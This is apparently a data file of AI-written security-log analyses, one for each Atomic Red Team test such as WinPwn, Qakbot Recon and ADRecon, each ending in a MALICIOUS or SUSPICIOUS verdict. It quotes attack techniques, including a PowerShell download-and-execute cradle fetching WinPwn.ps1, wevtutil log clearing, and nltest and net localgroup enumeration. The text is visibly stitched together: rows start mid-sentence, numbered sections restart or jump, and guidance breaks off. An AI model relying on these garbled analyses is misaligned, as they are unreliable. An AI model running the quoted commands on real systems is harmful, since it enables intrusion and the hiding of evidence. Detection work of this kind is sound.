   - Although the update logs for Windows Defender are benign, their presence on the timeline of log clearing attempts and PowerShell executions indicate an overlap, which could be used as a distraction or to blend malicious activities with legitimate ones.

### Resolution

- **Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Incident Response**:
   - Immediately isolate the affected host ""Server002"" to prevent further damage or data exfiltration.
   - Conduct a thorough digital forensic investigation to understand the extent of the compromise and determine how the user ""admin_test"" acquired high privileges.

2. **Access Control**:
   - Re-evaluate and tighten the permissions for users. Ensure that users have the least privilege necessary for their roles.

3. **Increase Monitoring**:
   - Implement or increase monitoring on PowerShell scripts executions, particularly those performing atypical network activities or making changes to security settings.

4. **Audit Logs**:
   - Regularly audit logs for similar activities, particularly for logon events, privilege assignment, and system log clearance.
   - Ensure the security logs have proper forwarding and are stored securely to detect any unauthorized alterations.

5. **Security Awareness**:
   - Educate staff about the risks of using elevated privileges irresponsibly and perform regular training to detect phishing or social engineering attempts."
Security Software Discovery,"Upon analysis of the provided Windows event logs, the following key observations were made:

**1. Log Clearing Events:**
- **System Log (Event ID 104):** Indicates that logs were cleared by the user ""admin_test"" on Server002. Specifically, system logs and Windows PowerShell logs were cleared.
- **Security Log (Event ID 1102):** Security logs were cleared by the same user.

**2. Suspicious Process Activity:**
- Multiple instances of the `wevtutil.exe` command were used to clear logs (System, Application, Security, Windows PowerShell). This is indicative of a potential attempt to cover tracks.
- Process execution involving various PowerShell commands and Sysmon observations of processes like `cmd.exe`, `wevtutil.exe`, `netsh.exe`, and `findstr.exe` executing in ways that suggest reconnaissance activities. 
- Notably, `cmd.exe` was used to invoke multiple network configuration commands (`netsh`) and various PowerShell commands intended to search for specific processes and services.

**3. Windows PowerShell Activity:**
- The PowerShell commands logged are aimed at querying process and service names related to ""Sysmon"", which can be indicative of someone checking if the system monitoring tools are running.
- Execution of `Get-Process`, `Get-Service`, and `Get-CimInstance` PowerShell commands align with reconnaissance efforts.

**Assessment of Events:**
The actions of log clearing by a named user, combined with the specific PowerShell and command-line utilities' activities, strongly suggest malicious intentions. This pattern is common in scenarios where an attacker attempts to gather information about a system and cover their tracks by clearing logs to remove evidence of their actions.

**Conclusion:**
Resolution: **MALICIOUS**

**Recommendation:**
- Investigate the user account ""admin_test"" for potential compromise or misuse.
- Review the access control policies and audit log access for privileged accounts.
- Consider isolating the affected system until a thorough investigation is completed.

System Time Discovery - PowerShell,"### Detailed Analysis of the Logs

#### Key Observations:
1. **Logged Activities**:
   - Multiple instances of `wevtutil.exe` usage at high integrity - cleaning or manipulating event logs, specifically Application, System, and Security channels.
   - `wevtutil.exe` is executed with various command-line arguments (`cl Application`, `cl System`, `cl Security`) which suggests clearing event logs.
   - Usage of `whoami.exe` and `hostname.exe`, though these are typically benign system utilities for querying information, they are often used in script reconnaissance or establishing user profile checks.
   - `powershell.exe` was executed, though it was simple execution for a “Get-Date” command; PowerShell is a common vector for attacks, especially with scripts.
   
2. **Indicators of Log Tampering**:
   - The use of `wevtutil.exe` to clear logs is a strong indicator of potentially malicious activity aiming to cover tracks.
   - Security log entry Event ID 1102 - ""The audit log was cleared"" - is a strong indicator of log tampering.

3. **Suspicious Process Execution**:
   - Multiple processes were started by the same user (`SERVER002\admin_test`) in a short time span which includes system utilities like `wevtutil.exe` at elevated privileges. 
   - Consistent administrative access to execute system utility commands is unusual if not correlated with known administrative actions.

4. **Edge Update Activities**:
   - Several edge update-related processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, etc.) were executed. While normal updates could appear similar, combined with high privilege activity and tampering, it warrants further inspection.

5. **Time-based Anomalies**:
   - The time was altered as noted in the system logs (Kernel-General) and Security logs (Event ID 4616), suggesting potential tampering.

#### Assessment:
The logs present several strong indications of suspicious and malicious behavior. The primary concerns are the use of `wevtutil.exe` to clear event logs, which is commonly done to hide malicious activity. The presence of high-integrity level activities performed without clear, known correlation to maintenance or administrative activity suggests these activities are intended to obfuscate actions or access.

Additionally, the sequence and nature of the commands in rapid succession are indicative of scripted or automated actions, likely part of a post-exploitation routine.

### Final Resolution: MALICIOUS
- **Threats Identified**:
  - Log tampering to cover tracks.
  - Potential unauthorized access.
  - System utilities used in conjunction with activities typical in compromise routines.

- The logs provided from the Application, System, Sysmon, and Security sources show a critical sequence of events happening on `Server002` around `2024-10-22 14:04`.
- The analyzed logs include both legitimate activities and suspicious activities.

#### **2. Suspicious Activities Identified:**
 
- **Log Clearing:**
  - In the System log, events with `EventID 104` and `EventID 1102` in the Security log indicate manual clearing of logs. The `admin_test` user cleared the `System`, `Windows PowerShell`, and `Security` logs. Log tampering, especially Security logs, is a common indicator of malicious activity as threat actors often try to cover their tracks.

- **Use of `wevtutil.exe`:**
  - Multiple entries in the Sysmon log exhibit the use of `wevtutil.exe` to clear event logs (`cl` command). This utility is often misused for malicious purposes to clear specific Windows Event Logs as seen in entries for clearing `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs.

- **Network Monitoring Utility Execution:**
  - `cmd.exe` executed `pktmon.exe` with command arguments used to start and stop the packet monitoring. While `pktmon.exe` is a legitimate packet monitoring tool, its execution in such a manner without a valid reason or documentation could be suspicious, especially if done outside normal administrative periods.
  
- **Privilege Escalation:**
  - Events with `EventID 4672` in the Security logs indicate special privileges were assigned to the `admin_test` user, including `SeDebugPrivilege`, `SeBackupPrivilege`, etc. The context and timing of these privileges being requested could be anomalous if misused.

- **Miscellaneous Executions:**
  - There were instances of `whoami.exe` and `hostname.exe` executions that may indicate reconnaissance or enumeration activity.

#### **3. Benign Activities:**
- The execution and installation of Microsoft Edge Installer processes appear benign and consistent with scheduled update tasks (activities by `NT AUTHORITY\SYSTEM`).

### **Assessment and Resolution:**
- The sequence of events, particularly the clearing of logs and the use of `wevtutil.exe`, along with the packet monitoring activity, suggests an anomalous and potentially malicious behavior aiming to hide tracks after unauthorized activity.

Griffon Recon,"Upon reviewing the provided Windows event logs, the following observations and analysis were made:

### Suspicious Behavior Identified

1. **Event Log Clearing**:
   - Security Log (Event ID 1102), System Log (Event ID 104), and Sysmon Logs show multiple instances of log clearing using `wevtutil.exe`.
   - Log clearing is typically associated with attempts to hide malicious activity by eliminating forensic evidence. 

2. **PowerShell Activity**:
   - The PowerShell log entries demonstrate the execution of a script located in `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1082\src\griffon_recon.vbs`.
   - While `Atomic Red Team` exercises are typically associated with security testing and red team activities, if not authorized, this activity could indicate reconnaissance efforts by a malicious actor.

3. **Execution of `wevtutil.exe`**:
   - Sysmon logs show multiple executions of `wevtutil.exe` with command lines used to clear logs (e.g., ""cl Security"") around the same timeframe the logs were cleared.
   - The execution of `wevtutil.exe` with the purpose of clearing logs further supports the hypothesis of malicious intent.

4. **Usage of Legacy Script Hosts**:
   - The execution of `cscript.exe` to run VBS scripts indicates the use of legacy scripting technologies which could be leveraged for malicious scripting or testing if there was unauthorized execution.

5. **Process Execution by `admin_test`**:
   - The user `admin_test` is observed executing scripts and clearing logs. The integrity level is “High”, indicating administrative privileges which can be utilized for significant system modifications.

### Assessment and Conclusion

Given the outlined abnormal and suspicious activities, specifically the clearing of logs, execution of potentially reconnaissance scripts without clear authorization, and administrative activities by `admin_test`, these patterns point towards potentially malicious behavior:

- Clearing logs is a common technique used by attackers to cover their tracks.
- The execution of scripts from a recognized security testing path like `Atomic Red Team` suggests dual-use and needs clear authorization proof.

### Recommended Actions

1. **Investigation**:
   - Verify if the PowerShell scripts and subsequent actions were authorized by internal security teams (like a Red Team operation).
   - Check organization documentation to confirm whether `admin_test` had permission for these activities.

2. **Forensic Analysis**:
   - Deep dive into the systems for residual forensic artifacts that may indicate unauthorized changes.
   - Monitor the activities of the `admin_test` account for any further suspicious actions.

3. **Enhanced Monitoring**:

Windows - Discover domain trusts with nltest,"### Analysis of Windows Event Logs

#### Indicators of Suspicious or Anomalous Behavior

1. **Log Clearing:**
   - Multiple events indicate the clearing of log files, which is often associated with malicious activity as attackers attempt to erase evidence. 
   - Security Log EventID 1102 indicates clearing of the Security log.
   - System Log EventID 104 indicates clearing of the System log and the Windows PowerShell log.
   - All these events were carried out by a user with the username `admin_test` under the computer `Server002`.

2. **Command Execution:**
   - In the Sysmon log, there are several executions of command-line tools like `wevtutil.exe` (Eventing Command Line Utility) running commands such as `cl` for clearing logs. This suggests an attempt to delete event logs, which aligns with the log-clearing events mentioned above.

3. **Processes Executed with High Integrity Levels:** 
   - Processes executed with High Integrity Level include `cmd.exe` which executed commands like `nltest.exe`. While `nltest` is a legitimate tool, its execution alongside commands for trusted domains (`nltest /domain_trusts & nltest /trusted_domains`) could be used for domain reconnaissance.

4. **Behavior Consistency:**
   - A sequence of multiple wevtutil.exe executions clearing different logs (Operational, Application, Security, System) suggests an attempt to cover tracks by a potentially malicious user. 

#### Assessment of Malicious Activity

The activities noted, such as clearing multiple logs and executing commands potentially for reconnaissance or covering tracks, strongly suggest malicious intentions. The user `admin_test` has executed commands that are typically flagged during a post-exploitation phase of an attack, particularly log clearing which is a classic indicator of compromise. Furthermore, the high integrity level of these operations additionally suggests that actions were taken with elevated privileges, pointing towards possible privilege escalation or just persistence of elevated access.

#### Conclusion and Resolution

- **Resolution: MALICIOUS**
  - The combination of log clearing, execution of potentially reconnaissance-oriented commands, and patterns of elevated command executions are strong indicators of compromise.
  - These logs across a short timeframe suggest concerted actions to both perform network-related reconnaissance and to cover tracks, typically associated with malicious activity.

#### Guidance on How to Proceed

Security Software Discovery - powershell,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious activity were identified:

1. **PowerShell Activity:**
   - The logs indicate multiple instances of PowerShell being used with suspect command-line activity. The commands include getting processes with descriptions that contain strings related to antivirus and cybersecurity tools (e.g., ""virus"", ""carbonblack"", ""defender"", ""cylance"", ""mc"", and ""Sysmon""). This type of activity is commonly seen in reconnaissance phases of an attack where the attacker is identifying what security tools are present on the system. 

2. **Event Log Clearing:**
   - The logs show that the `admin_test` user cleared several logs, including the System, Security, and Windows PowerShell logs. This is a common tactic to hide malicious activity by removing evidence. The clearing of logs, especially when coupled with suspicious PowerShell activity, often suggests an attempt to cover tracks after malicious actions.

3. **Time Manipulation:**
   - There's evidence of system time changes in the logs. The `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Security-Auditing` event entries suggest the system time was altered. Time manipulation can be an attempt to disrupt logging or affect timestamp-based security measures.

4. **Sysmon Events:**
   - There are numerous `wevtutil` commands executed by `admin_test`, which are responsible for managing and querying Windows events. This utility was used in conjunction with clearing logs, reinforcing the other identified suspicious activities.
   - Frequent executions of legitimate tools like `whoami.exe`, `hostname.exe`, and `conhost.exe` under the same user (`admin_test`) suggest either automated scripts running reconnaissance commands or manual activity looking to understand system specifics and permissions.

   - `wevtutil.exe` is used to clear event logs (e.g., EventRecordID 17960 indicates a command `wevtutil.exe cl Application`). This utility is frequently used in log manipulation activities, potentially to cover tracks.

3. **Suspicious Command Execution**:
   - A `cmd.exe` process was started with the command line `/c where /R C:\Users\ Bookmarks` (EventRecordID 17984). This could indicate interactive probing for files named ""Bookmarks"" which might hold sensitive information such as browser bookmarks often related to stored credentials or browsing habits.

4. **High Integrity Level Executions**:
   - Multiple processes are executed with a ""High"" integrity level by the ""admin_test"" account. This shows privilege execution, and if unauthorized or unexpected by the context of usual user activity, could be concerning.

5. **Use of Windows Management Instrumentation (WMI) Processes**:
   - The appearance of `WMIADAP.exe` and `WmiPrvSE.exe` processes is noted. While these can be legitimate, they can also be used for lateral movement or persistence by an attacker leveraging WMI.

6. **Frequent Execution of System Utilities**:
   - Utilities such as `whoami.exe`, `whoami.exe`, and `hostname.exe` were run repeatedly. Such normal utilities being run in quick succession may indicate probing of system information by a user or script which could be part of reconnaissance activities.

7. **Network Service Activity**:
   - `sppsvc.exe` and other WMI associated processes were executed under NT AUTHORITY. Skepticism is warranted due to association with service actions, but given no clear evidence of abuses from their legitimate function, require contextual judgement.

8. **Software Update Activity**:
   - Numerous activities are related to Microsoft Edge Update. While frequent updates are usual, their overlap with suspicious entries warrants further inspection. However, these updates alone are not found malicious here.

### Assessment: 

Based on the analysis, the evidence suggests suspicious activity, primarily focused on log file clearing, use of diagnostic tools/system utilities, and potential reconnaissance actions by the ‘admin_test’ account. The combination of these activities could be considered an attempt at covering tracks post unauthorized access or action.

### Resolution: SUSPICIOUS

### Guidance:
1. **Investigate User Account ""admin_test""**:
   - Conduct a thorough review of the account's activity both before and after the noted time stamps of the events. Check for login attempts, privileged access context, and access to sensitive resources.

2. **Review and Harden Logging Policies**:
   - Examine policies around log retention and access to tools like `wevtutil.exe`. Implement enhanced monitoring and alerting for log clearance events and administrative utility execution.

3. **Conduct System Integrity Checks**:
   - Review file integrity, check for unauthorized file modifications or unexpected software additions related to WMI, Windows Updates, and Edge installations.

4. **Network Monitoring**:
   - Request and analyze network logs surrounding the time of these events to identify potential lateral movements or data exfiltration activities.

This guidance will help determine the full scope of any potential security incident and mitigate risks posed by suspicious activities.

Basic Permission Groups Discovery Windows (Local),"### Analysis of Logs

Upon reviewing the provided logs across various channels (Application, System, Sysmon, and Security logs), several events stand out as suspicious and potentially indicative of malicious activity:

1. **Log Clearing Events**: 
   - Logs in the System (EventID 104 for 'System' and 'Windows PowerShell' channels) and Security (EventID 1102) logs were cleared by the user `admin_test`. Clearing event logs without a valid reason is often associated with an attempt to erase evidence of malicious activities.

2. **Privilege Modification and Potential Misuse**:
   - The security log shows an event with EventID 4799 indicating a group membership change by user `admin_test` on the local 'Administrators' group. This action is flagged as suspicious because unauthorized privilege escalation and misconfiguration changes are common tactics used by attackers. The use of `net` and `net1` commands further emphasizes potential misuse as these commands can manage user and group permissions.

3. **Unusual Command Executions**:
   - The Sysmon logs demonstrate potentially harmful command-line executions, such as `""cmd.exe"" /c net localgroup & net localgroup ""Administrators""`. Such commands can point to privilege enumeration or modification scripts that are usually a part of lateral movement or privilege escalation strategies.

4. **Time Changes**:
   - Events with EventID 4616 in the Security log and EventID 1 in the System logs indicate time changes. While time adjustments can be legitimate, repeated and unexplained time changes can also signify attempts to obscure timestamps on other malicious actions or logs.

5. **Unusual Executions Related to Edge Updates**:
   - Multiple Sysmon log entries show the execution of Microsoft Edge Update processes. While these processes are generally legitimate, the frequency and nature of their execution (e.g., `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` from a temp directory, etc.) warrant closer scrutiny to ensure they are not being manipulated or replaced with malicious code.

Overall, the combination of log clearing, privilege modification, unusual command executions, and frequent Edge update process activities suggest that these logs need further investigation.

### Conclusion and Guidance

**Resolution: SUSPICIOUS**

The logs contain activities that are highly suspicious and need more investigation to determine the exact nature of the actions happening on this host:

- **Next Steps:**
  1. **Conduct a Full Audit**: Investigate the context around the log-clearing activities. Determine if there were correlating suspicious activities.
  2. **Review Group Membership Changes**: Examine the rationale and impact of changes to the 'Administrators' group to verify if they were permissible.
  3. **Validate Edge Update Processes**: Confirm the integrity and legitimacy of all Edge Update files and processes. Check them against trusted versions, and ensure they are signed by Microsoft.
  4. **Scrutinize Unexplained Time Changes**: Look into reasons behind the time modifications and correlate them with other logged activities.
  5. **Broader Threat Hunting**: Execute additional threat hunting across the network to identify similar activities on other hosts or signs of lateral movement.

The combination and sequence of these events suggest a pattern consistent with an advanced, potentially malicious activity that requires comprehensive incident response measures to confirm the integrity and security of the system and network."
WinPwn - Powersploits privesc checks,"Upon reviewing the provided Windows event logs, several suspicious activities stand out that indicate potential malicious activity:

1. **Log Clearance**: 
   - The System log indicates two entries (EventID 104) where logs were cleared for the System and Windows PowerShell channels by the user ""admin_test"" on ""Server002"". 
   - Additionally, the Security log (EventID 1102) shows that the security logs were cleared by the same user ""admin_test"".
   - Log clearance is a common tactic used by attackers to hide their tracks by deleting event logs that might provide critical evidence of their actions.

2. **Suspicious PowerShell Activity**: 
   - The Windows PowerShell logs show that a PowerShell instance was executed with a command that imports and executes a script from a URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). 
   - Downloading and executing scripts directly from the internet is suspicious and often indicative of a malicious attempt to leverage PowerShell for execution of attack scripts.

3. **Use of wevtutil for Clearing Logs**:
   - Sysmon logs show the execution of `wevtutil.exe` by ""admin_test"" with command lines used to clear various Windows event logs (e.g., System, Application, Security, and Windows PowerShell).
   - This behavior is often associated with activities aiming to remove traces of malicious actions on the host.

4. **Command Execution Patterns**:
   - The logs include execution of certain executables (`wevtutil.exe`, `powershell.exe` with specific script downloads). 
   - The PowerShell script download execution and the use of hostname.exe and whoami.exe from a path related to non-interactive and console output suggest automated or script-based interaction likely intended for reconnaissance or persistence setup.

Assessment: 
- **Resolution: MALICIOUS**
- The combination of log clearance, suspicious PowerShell activity, and known hostile behavior patterns (such as script execution from potentially malicious online repositories) strongly indicates that the host was compromised and used for malicious purposes.

Recommendations:
- Isolate the affected system immediately to prevent further compromise or lateral movement by the threat actor.
- Conduct a full forensic analysis on the host to understand the scope of the compromise and identify any additional persistence mechanisms or payloads.
- Review network logs and other system logs to identify any potential data exfiltration or further malicious activity.
- Implement stricter controls on PowerShell execution policies and enhance monitoring to detect and alert on similar patterns.
- Consider resetting credentials for the affected account (admin_test) or any other accounts that might have been accessed during this period."
WinPwn - itm4nprivesc,"Upon reviewing the provided logs, several indicators suggest suspicious activity that may warrant further investigation. Let's break down the key findings:

### Key Findings:

1. **Log File Clearing:**
   - **System Log (EventID: 104)**
     - Logs indicate that the `admin_test` account cleared event logs: the System, Windows PowerShell, and Security logs.
     - Using the command `wevtutil.exe cl` is a known practice by attackers to cover tracks.

2. **PowerShell Execution:**
   - **Sysmon Log (EventID: 1) and Windows PowerShell Log:**
     - Logs reveal execution of PowerShell with a command that downloads and executes a script from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`).
     - This command is executed with high integrity levels, indicating potential privilege misuse or escalation attempts.
     - Scripts named `WinPwn` and commands like `itm4nprivesc` are often associated with penetration testing and exploit frameworks. This is highly suspicious.

3. **Repeated Usage of `wevtutil.exe`:**
   - The usage of `wevtutil.exe` is consistent with log clearing command:
     - Various logs indicate this executable was used under the context of `admin_test`, suggesting attempts to remove historical log data.

4. **Time Manipulation:**
   - **Kernel-General Events:**
     - There is an abnormal number of time change logs in quick succession. Though not inherently malicious, combined with other indicators, this could imply manipulation to disrupt log timestamping.

### Situation Assessment:

The events show clear signs of potentially malicious activity:
- Log files being cleared suggests attempts to obscure actions.
- Execution of unauthorized or potentially harmful PowerShell scripts indicates a compromised system or insider threat activity.

### Resolution:

**MALICIOUS**

### Threats and Risks Identified:
- Execution of potentially harmful scripts from external sources may indicate system compromise or data exfiltration.
- Obfuscation tactics like log clearing can prevent detection of an attack's full impact.
- Integrity of the server may be compromised; further unauthorized access or data leaks can occur.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network.
   - Conduct a memory and disk forensics analysis to capture artifacts and determine the impact extent.
2. **Investigative Actions:**
   - Review access logs and user activity for the `admin_test` account.
   - Determine if any unauthorized changes to critical configurations or scheduled tasks were made.

   - Reset passwords for compromised accounts.
   - Rebuild the compromised system from clean backups and update all security patches.
4. **Monitoring and Reporting:**
   - Increase monitoring on other systems for similar behaviors.
   - Report findings and action steps to security management and stakeholders for compliance and further monitoring.

Given these findings, additional analysis is crucial to uncover any associated threats potentially impacting the wider network infrastructure."
Qakbot Recon,"Upon reviewing the provided Windows event logs, several entries indicate activities that require further attention:

1. **Log Clearance Events**:
   - The security log (EventID 1102) and associated Sysmon logs indicate that the event logs on the system have been cleared. Log clearance is often an activity associated with malicious intent, specifically to cover tracks after unauthorized activities.

2. **Suspicious Commands and Tools**:
   - There are entries showing execution of known system utility tools with elevated privileges and integrity levels such as `wevtutil`, `cmd.exe`, `whoami`, `arp`, `ipconfig`, `net`, `nslookup`, and `route`. While these utilities are legitimate, they are often used by attackers during enumeration or post-exploitation phases to gather information about the network, the system, and active sessions.
   - There is evidence of a script or batch file, `qakbot.bat`, being executed from a `Temp` directory via `cmd.exe`, which mentions usage of commands similar to those used in malicious exploitation or reconnaissance scripts. 

3. **Privileged Account Activity**:
   - The logs show activity under the username `admin_test` with high-privilege tokens and roles (`SeSecurityPrivilege`, `SeDebugPrivilege`, etc.), which may indicate misuse or compromise of this account.

4. **Multiple Microsoft Edge Updates**:
   - A high number of `setup.exe` instances related to Microsoft Edge is seen. While updates can be legitimate, the frequency and the variety of processes (including paths to `Microsoft\\EdgeUpdate`) could suggest potential misuse, especially when combined with other suspicious activities.

5. **Remote Logon and Network Activities**:
   - Several log entries show logon events from remote devices (IP addresses `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102`) using the NTLM authentication process. Remote logins could point to lateral movement attempts, especially if the accounts were accessed without user actions.

Based on these findings, the logs suggest suspicious activity characteristic of penetration testing exercises or potential malicious behavior. This warrants further investigation to determine the intent and impact of these actions.

**Resolution**: SUSPICIOUS

**Guidance**:
- Perform a thorough investigation of the `admin_test` account activities to understand the actions taken and whether the account was compromised.
- Verify the legitimacy of the `qakbot.bat` script by examining its source and purpose, given the similarity to known malware naming conventions.
- Investigate the source of the remote logons and check if there were any unauthorized access attempts.
- Monitor the server for additional suspicious activities, including unexpected network communication or further system changes.
- Consider isolating the affected system to prevent potential spread or additional malicious actions.
- Engage with the IT team to review security updates and configurations to enhance monitoring and detection capabilities against unauthorized logom and execution of potentially malicious utilities."
Automated AD Recon (ADRecon),"The log entries provided reveal several suspicious activities on the Windows host, which necessitate further investigation. Here's the detailed analysis:

1. **Log Clearing Events:**
   - Multiple logs indicate the clearing of event logs by the user `admin_test`. Specifically, event logs for the System, Windows PowerShell, and Security were cleared (`EventID 104` from System logs and `EventID 1102` from Security log). This is often a strategy used by attackers to cover their tracks after a compromise.

2. **PowerShell Activity:**
   - The execution of a PowerShell script `ADRecon.ps1` through `Invoke-Expression` is highlighted in the Windows PowerShell logs. This script is located in a temporary directory: `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\ADRecon.ps1`. The specific use of `Invoke-Expression` to run a script from a temporary location is suspicious and characteristic of malicious activity, especially if the script is a known reconnaissance tool like `ADRecon`.

3. **Unusual Privileges and Process Creation:**
   - There is a `4624` logon event with logon type `5`, which typically indicates a service startup (SYSTEM user account is using it). However, combined with `4672` showing the use of extensive privileges (e.g., `SeDebugPrivilege`), this could be suspicious if it correlates with unauthorized privilege escalation.

4. **Sysmon Log Observations:**
   - The process `wevtutil.exe` is executed multiple times with the command line indicating the clearing of specific channels like `Microsoft-Windows-Sysmon/Operational`. This supports further evidence of attempts to remove traces of potentially malicious activity.

5. **Behavioral Patterns:**
   - The sequential execution of processes like `wevtutil.exe`, `whoami.exe`, and `taskhostw.exe`, alongside frequent clearing of logs, implies a possible attempt to maintain persistence, enumerate user details, and perform malicious actions while remaining unnoticed.

6. **Credential and Account Enumeration:**
   - Event ID `5379` indicates attempts to retrieve credential information from services like `MicrosoftAccount` related to a user account (`02txoixylodcstop`). The pattern of failed attempts to obtain credentials can be indicative of a brute force or account reconnaissance activity. 

Given the outlined evidence and activities, the indicators suggest:
- There is substantial evidence pointing toward probable malicious activity, particularly with the log clearing, PowerShell script execution from suspicious directories, and attempts to obscure tracks by deleting event logs.
  
**Resolution: MALICIOUS**

### Guidance:
1. **Immediate Containment and Investigation:**
   - Isolate the affected host from the network to minimize further compromise.
   - Preserve the existing logs and create forensic image backups for a detailed investigation.

2. **Root Cause Analysis:**
   - Conduct a thorough investigation to determine how the `admin_test` account was compromised or misused.
   - Check for similar activities on other hosts in the network.

3. **Revocation and Reset:**
   - Revoke access and change credentials for any potentially compromised accounts, especially the affected `admin_test` account.

4. **Security Hardening and Monitoring:**
   - Implement stricter access controls and multi-factor authentication, especially for administrator accounts.
   - Increase logging and monitoring across all systems to detect potential log clearing or unusual administrative actions promptly.

5. **Education and Awareness:**
   - Educate users on recognizing phishing and other common compromise tactics that could lead to such behavior on servers."
WinPwn - winPEAS,"Upon reviewing the logs provided, several activities stand out that indicate potentially malicious behavior. Below is a detailed analysis:

### 1. PowerShell Activity
- In the Windows PowerShell logs, we observe PowerShell executing a command that downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). The use of `iex(new-object net.webclient).downloadstring` is a known technique used by attackers to execute scripts directly from the internet.
- The executed script includes `winPEAS` which is a known tool for privilege escalation audit on Windows systems. The nature and method of execution strongly point towards an unauthorized security assessment or potential exploitation activity.

### 2. Log Clearing
- The System and Security logs identify events where logs were cleared. Specifically, the events:
  - `EventID: 104` in System log
  - `EventID: 1102` in Security log
  These events correlate with an account named ""admin_test"" being used to clear logs, which is often done by malicious actors attempting to cover their tracks after compromising a system.

### 3. Use of Windows Utilities
- The Sysmon logs show the use of `wevtutil.exe` to clear event logs for System, Security, and PowerShell channels. This was performed under the user ""admin_test"" and typically is associated with malicious activities to evade detection.
- Additionally, the unusual execution of commands such as `whoami`, `hostname`, and `conhost.exe` appears in the context of this suspicious activity, potentially suggesting reconnaissance actions.

### 4. Unusual Process Execution
- Multiple instances of Microsoft Edge Update processes are recorded within a narrow time frame. While updates are common, the timing and clustering among potential unauthorized actions raise suspicion of them being utilized as a disguise for other actions.
  
### Conclusion and Assessment

Based on the analysis above, the logs indicate malicious activity. The following points highlight the threat indicators:
- The execution of a PowerShell script from an external source, coupled with security audit tools like `winPEAS`.
- The clearing of event logs by a user's account ""admin_test"" (S-1-5-21-3962163828-2803415714-1403596700-1006) without a typical or known reason.
- The use of `wevtutil.exe` for log clearing aligns with known malware persistence and evasion techniques.

### Resolution: MALICIOUS

#### Recommendations:
1. **Immediate Isolation**: Isolate the affected host (Server002) to prevent any potential lateral movement or further compromise within the network.
2. **Forensic Investigation**: Conduct a deeper forensic investigation to determine the extent of the compromise, including detailed analysis of file integrity and possible data exfiltration.
3. **Audit User Activity**: Investigate and audit the account ""admin_test"" for any unauthorized access or actions across the network.
4. **Patch and Update**: Ensure all security patches are applied, focusing on PowerShell security settings, and review script execution policies.
5. **Security Awareness**: Enhance user awareness training to spot phishing or unauthorized activities leading to such a breach.

Proceed with mitigation measures and engage your incident response team to handle the situation based on organizational protocols."
System Service Discovery - net.exe,"Upon reviewing the provided event logs, several details stand out that could indicate suspicious or potentially malicious activities:

1. **Event Log Clearing:** The `Security` log entry with `EventID 1102` indicates that the security logs were cleared by a user identified as `admin_test`. This action is generally considered a strong indicator of potentially malicious activity, as clearing event logs can be an attempt to cover tracks after unauthorized or unwanted actions. Additionally, the `System` log entries with `EventID 104` indicate that both the `System` and `Windows PowerShell` logs were cleared. The timing of these events is clustered closely, which suggests a deliberate clearing of logs by the same user, `admin_test`.

2. **Privilege Use:** Multiple `Security` event logs with `EventID 4672` show that the user `admin_test` had special privileges (e.g., SeDebugPrivilege), which might be used for activities such as debugging processes or viewing sensitive system details. While this action in itself isn't necessarily malicious, combined with other indicators, it raises concern.

3. **Process Execution:** The `Sysmon` logs show multiple executions of `wevtutil.exe` which was used to clear application, security, system, and Windows PowerShell logs, again attributed to the user `admin_test`. This utility is typically used to manage event logs and often seen in scenarios involving log tampering or clearing.

4. **Command Execution via `cmd.exe`:** There's an unusual command `net.exe start` redirected to a temporary file (`%%temp%%\\service-list.txt`) indicating enumeration of services running on the system. While it might be benign in some cases, it's notable when combined with other suspicious behavior.

5. **Unauthorized User Activity:** Usage of tools like `whoami` and `hostname` by `admin_test` can be common, but in conjunction with log clearance and privileged activities, they may indicate an attempt to gain information on system or user context without being detected.

6. **Network and System Executables:** Although the execution of tools like `MicrosoftEdgeUpdate.exe` and `wuauclt.exe` for updating processes is typical, the timing and confluence with other behaviors might suggest they're being leveraged or run post-compromise for system updates or as a cover for other activity.

In conclusion, the combination of log clearing, privilege escalation, and the execution of certain utilities provides strong evidence of potentially malicious activity. Therefore, the overall assessment is:

- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough investigation of the user account `admin_test` to understand the context and cause of these actions.
- Review system access logs and alert the IT security incident response team to isolate `Server002` from the network for further forensic analysis.
- Verify the integrity of sensitive data on `Server002` and check for any unauthorized exfiltration or modification.
- As an immediate measure, consider resetting passwords and reviewing access control policies, particularly for privileged accounts.
- Implement enhanced monitoring for similar events on other systems.
- After containment, perform a comprehensive vulnerability assessment and patch management review."
Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting),"Upon reviewing the provided event logs, several elements of potentially concerning activity stand out:

1. **Log Clearing Activity (Event IDs 1102 and 104):**
   - Both security log and system log entries indicate that an account (`admin_test`) cleared the logs using `wevtutil.exe`. Clearing logs is a common tactic used by malicious actors to cover their tracks.

2. **PowerShell Activity:**
   - The PowerShell event logs indicate an execution with a command using `Get-ADUser`, which is typically seen in environments where user account information is queried. The command was executed as part of a PowerShell session by the `admin_test` user account. This action itself is not inherently malicious but can be indicative of information gathering.

3. **High Privilege Use (Event ID 4672):**
   - The `admin_test` account, operating under `SYSTEM` context, was granted many high-level privileges (including `SeDebugPrivilege` and `SeImpersonatePrivilege`). This level of access is necessary for administrative tasks but is highly risky if misused. Normal operations do not usually trigger these events frequently.

4. **Suspicious Command-Line Activity:**
   - The repeated use of `wevtutil.exe` to clear various logs (Security, System, and PowerShell) is concerning. This tool is commonly used in forensic-wiping techniques.

5. **Credential Access Attempt Failures (Event ID 5379):**
   - There are numerous credential access failures indicated by Event ID 5379 entries showing attempts to read Microsoft account credentials associated with `02txoixylodcstop`. The `ReturnCode` suggests failures, which might still indicate a probing attempt or misconfiguration.

Based on these observations, I would categorize the situation as **SUSPICIOUS** due to the following reasons:
- Log clearing is an uncommon operation, especially rapid execution of these events in succession, requiring further inquiry.
